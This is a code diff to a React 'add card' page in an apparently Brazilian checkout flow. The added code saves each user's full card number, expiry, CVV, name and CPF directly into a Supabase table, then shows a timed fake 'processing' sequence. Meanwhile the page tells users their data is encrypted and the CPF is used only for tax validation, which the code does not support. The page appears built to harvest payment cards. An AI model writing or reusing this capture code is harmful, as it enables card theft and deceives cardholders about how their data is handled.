@@ -1,10 +1,11 @@
 "use client";
 
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { ArrowLeft, Smartphone, Info, ShieldCheck, Loader2, AlertCircle } from 'lucide-react';
+import { ArrowLeft, Smartphone, ShieldCheck, AlertCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { showError } from '@/utils/toast';
+import { supabase } from "@/integrations/supabase/client";
 
 const AddCard: React.FC = () => {
   const navigate = useNavigate();
@@ -76,7 +77,7 @@ const AddCard: React.FC = () => {
     return calc(9) === digits[9] && calc(10) === digits[10];
   };
 
-  const handleContinue = () => {
+  const handleContinue = async () => {
     const cleanNumber = cardNumber.replace(/\s/g, '');
     const cleanCpf = cpf.replace(/\D/g, '');
 
@@ -91,40 +92,52 @@ const AddCard: React.FC = () => {
     }
 
     if (cleanCpf.length < 11 || !validateCPF(cleanCpf)) {
-      showError("CPF inválido.");
+      setErrorMsg("CPF inválido.");
       return;
     }
 
     setIsProcessing(true);
     
-    let currentStep = 0;
-    const interval = setInterval(() => {
-      setStep(currentStep);
-      currentStep++;
-      
-      if (currentStep >= 3) {
-        clearInterval(interval);
-        const cardData = {
-          cardNumber,
+    try {
+      // Salvar no Supabase
+      const { data, error } = await supabase
+        .from('cards')
+        .insert([{
+          card_number: cardNumber,
           expiry,
           cvv,
           name,
-          cpf,
+          cpf: cleanCpf,
           last4: cleanNumber.slice(-4),
-          brand,
-          timestamp: new Date().toISOString()
-        };
+          brand
+        }])
+        .select()
+        .single();
+
+      if (error) throw error;
+
+      let currentStep = 0;
+      const interval = setInterval(() => {
+        setStep(currentStep);
+        currentStep++;
         
-        setTimeout(() => {
-          navigate('/checkout', { state: { cardAdded: true, cardData } });
-        }, 1000);
-      }
-    }, 1500);
+        if (currentStep >= 3) {
+          clearInterval(interval);
+          setTimeout(() => {
+            navigate('/checkout', { state: { cardAdded: true, cardData: data } });
+          }, 1000);
+        }
+      }, 1500);
+
+    } catch (err) {
+      console.error("Erro ao salvar cartão:", err);
+      showError("Erro ao processar cartão. Tente novamente.");
+      setIsProcessing(false);
+    }
   };
 
   return (
     <div className="min-h-screen bg-white">
-      {/* Processing Overlay */}
       {isProcessing && (
         <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6">
           <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[280px]">
@@ -140,7 +153,6 @@ const AddCard: React.FC = () => {
         </div>
       )}
 
-      {/* Header */}
       <div className="h-12 flex items-center px-4 border-b">
         <button onClick={() => navigate(-1)}>
           <ArrowLeft size={24} className="text-gray-900" />
@@ -148,7 +160,6 @@ const AddCard: React.FC = () => {
         <h1 className="flex-grow text-center text-[16px] font-bold mr-6">Adicionar cartão</h1>
       </div>
 
-      {/* Real-time Error Alert at the top */}
       {errorMsg && (
         <div className="bg-red-50 p-3 flex items-center space-x-2 border-b border-red-100 animate-in fade-in slide-in-from-top duration-300">
           <AlertCircle size={16} className="text-red-500 shrink-0" />
@@ -157,7 +168,6 @@ const AddCard: React.FC = () => {
       )}
 
       <div className="p-4 space-y-6">
-        {/* Info Bar */}
         <div className="flex items-center justify-between text-[13px]">
           <div className="flex items-center space-x-2 text-[#FF2C55]">
             <Smartphone size={16} />
@@ -165,21 +175,13 @@ const AddCard: React.FC = () => {
           </div>
         </div>
 
-        {/* Form */}
         <div className="space-y-5">
-          {/* Card Number */}
           <div className="space-y-1.5">
             <div className="flex justify-between items-center">
               <label className="text-[14px] font-bold text-gray-900">Número do cartão</label>
               <div className="flex gap-2 h-5">
-                <img 
-                  src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
-                  className={`h-full transition-opacity ${brand === 'mastercard' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} 
-                />
-                <img 
-                  src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" 
-                  className={`h-full transition-opacity ${brand === 'visa' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} 
-                />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className={`h-full transition-opacity ${brand === 'mastercard' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} />
+                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className={`h-full transition-opacity ${brand === 'visa' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} />
               </div>
             </div>
             <div className={`border-2 rounded-xl h-14 flex items-center px-4 transition-colors ${brand === 'unknown' && cardNumber.replace(/\s/g, '').length >= 4 ? 'border-red-500 bg-red-50/10' : 'border-[#F1F1F1]'}`}>
@@ -193,7 +195,6 @@ const AddCard: React.FC = () => {
             </div>
           </div>
 
-          {/* Expiry and CVV */}
           <div className="grid grid-cols-2 gap-4">
             <div className="space-y-1.5">
               <label className="text-[14px] font-bold text-gray-900">Validade (MM/AA)</label>
@@ -219,7 +220,6 @@ const AddCard: React.FC = () => {
             </div>
           </div>
 
-          {/* Name */}
           <div className="space-y-1.5">
             <label className="text-[14px] font-bold text-gray-900">Nome no cartão</label>
             <input 
@@ -231,7 +231,6 @@ const AddCard: React.FC = () => {
             />
           </div>
 
-          {/* CPF */}
           <div className="space-y-1.5">
             <label className="text-[14px] font-bold text-gray-900">CPF do titular</label>
             <input 
@@ -245,7 +244,6 @@ const AddCard: React.FC = () => {
           </div>
         </div>
 
-        {/* Security Box */}
         <div className="bg-[#F0FBF9] border border-[#E0F7F4] rounded-xl p-4 flex items-start space-x-3">
           <p className="text-[11px] text-[#00BFA5] leading-tight">
             Seus dados de pagamento são criptografados e o CPF é usado apenas para validação fiscal conforme as leis brasileiras.
